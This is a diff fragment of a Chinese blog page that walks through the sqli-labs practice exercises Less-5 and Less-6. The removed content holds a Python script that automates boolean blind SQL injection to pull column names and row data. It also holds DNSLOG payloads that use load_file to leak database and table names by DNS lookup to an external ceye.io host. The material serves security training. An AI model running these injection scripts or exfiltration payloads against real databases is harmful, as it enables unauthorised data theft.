-for i in range(column_dic[table_list[-1]]):#4
-    column_name = &quot;&quot;
-    for j in range(20):
-        payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))--+&quot;%(database_name,table_list[-1],str(i),str(j+1))
-        #print url+payload
-        re = requests.get(url+payload)
-
-        if &apos;You are in&apos; not in re.text and re.status_code == 200:
-            column_len = j
-            #print column_len
-            for k in range(column_len):
-                for chr in str1:
-                    payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,table_list[-1],str(i),str(k+1),ord(chr))
-                    re = requests.get(url+payload)
-                    #print url+payload
-                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-                        column_name += chr
-                        break
-
-            print column_name
-            column_list.append(column_name)
-            break
-print &quot;%s表有%s字段,分别为:%s&quot;%(table_list[-1],column_dic[table_list[-1]],column_list)
-#column_list = [&apos;id&apos;,&apos;username&apos;,&apos;password&apos;]
-
-
-
-
-print &quot;开始猜解%s表的数据量.......&quot;%(table_list[-1])
-for i in range(20):
-    payload = &quot;&apos; and (select count(%s) from %s)=%s--+;&quot;%(column_list[1],table_list[-1],str(i))
-    re = requests.get(url+payload)
-    #print url+payload
-    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-        data_num = i
-        break
-print &quot;得到%s表的数据量为%s组&quot;%(table_list[-1],str(data_num))
-#data_num:13
-
-print &quot;开始猜解%s表的%s列的数据.......&quot;%(table_list[-1],column_list[1])
-for i in range(data_num):
-    for j in range(20):
-        date_name = &quot;&quot;
-        payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %s,1),%s,1))--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(j+1))
-        re = requests.get(url+payload)
-        #print url+payload
-        if &apos;You are in...........&apos; not in re.text and re.status_code == 200:
-
-            for k in range(j):  #输入每个字符的长度
-                for chr in str1:
-                    payload = &quot;&apos; and ascii(substr((select %s name from %s.%s limit %s,1),%s,1))=%s--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(k+1),str(ord(chr)))
-                    re = requests.get(url+payload)
-                    #print url+payload
-                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-                        date_name += chr
-                        break
-            date_list.append(date_name)
-            break        
-print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_list)
-</code></pre><p>运行结果:<br><img src="http://static.zybuluo.com/chhyx/2n73z1533r7e7j9spwymv4tt/image_1cqfl19qe1eb21vb11nor1itstknp.png" alt="image_1cqfl19qe1eb21vb11nor1itstknp.png-101kB"></p>
-<p>写这个脚本时主要是为了学习盲注,但是写完发现还有好多可改进的地方,比如没用函数包裹,猜解效率太低(可以考虑使用二分法)。有时间再改吧。</p>
-<p>##<strong>Less-6:</strong><br>加单引号<code>&#39;</code>页面无明显返回:<br><img src="http://static.zybuluo.com/chhyx/742qe6uxv1qzc8q878jbizq2/image_1cqfsnokf112n1pokbbe1m6mn150.png" alt="image_1cqfsnokf112n1pokbbe1m6mn150.png-207.4kB"></p>
-<p>加个双引号<code>&quot;</code>试试:<br><img src="http://static.zybuluo.com/chhyx/7833nzrji74ghcfxxqrck3qj/image_1cqfsl3oa1f15uin13p41gcd9j51j.png" alt="image_1cqfsl3oa1f15uin13p41gcd9j51j.png-214.6kB"></p>
-<p>我们输入的1”变成了’”1”” limit 0,1’ 可发现多了一个双引号 我们注释掉它继续猜解。且我们可猜测后台处理语句为:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;
-</code></pre><p>那我们将Less-5所用payload中的<code>&#39;</code>改为<code>&quot;</code>即可成功利用。</p>
-<p><img src="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png" alt="image_1cqftpsuureu1uh18071tcl1djp9e.png-54.9kB"></p>
-<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
-<p>获取数据库名:</p>
-<pre><code>id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
-</code></pre><p>即可在我们的dns平台查看数据库内容:<br><img src="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png" alt="image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png-46.2kB"></p>
-<p>获取表名：</p>
-<pre><code>&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/1hf0mvtjsayzma47kbr7zuo3/image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png" alt="image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png-99.1kB"></p>
-<p>之后更换我们的SQL语句即可获取数据。这种方式的优点是获取数据快,但是利用的条件相对来说较苛刻。不过在平常的测试中作为一种测试手法还是可以的。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3060,7 +3032,7 @@ print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
